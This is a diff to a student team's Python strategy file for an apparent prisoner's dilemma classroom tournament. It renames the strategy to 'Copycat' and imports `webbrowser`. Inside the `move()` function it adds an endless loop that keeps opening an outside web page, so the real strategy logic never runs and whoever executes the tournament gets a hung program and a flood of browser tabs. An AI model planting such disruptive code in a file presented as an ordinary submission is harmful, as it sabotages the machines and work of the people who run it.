@@ -1,4 +1,6 @@
 #Riley & Aidan Test Pygmy-Marmoset Ratatoskr EmeraldGreen Black
+import webbrowser
+
 ####
 # Each team's file must define four tokens:
 #     team_name: a string
@@ -8,8 +10,8 @@
 ####
 
 team_name = 'Ratatoskr!' # Only 10 chars displayed.
-strategy_name = 'Yggdrasil'
-strategy_description = 'Based_on_what_you_do'
+strategy_name = 'We cOPy You BEcause We ARe MEEan'
+strategy_description = 'Copycat'
     
 def move(my_history, their_history, my_score, their_score):
     ''' Arguments accepted: my_history, their_history are strings.
@@ -26,6 +28,9 @@ def move(my_history, their_history, my_score, their_score):
     
     # Analyze my_history and their_history and/or my_score and their_score.
     # Decide whether to return 'c' or 'b'.
+
+    while(1==1):
+        webbrowser.open('http://heeeeeeeey.com/')
 
     if len(my_history) == 0:
         return 'c'
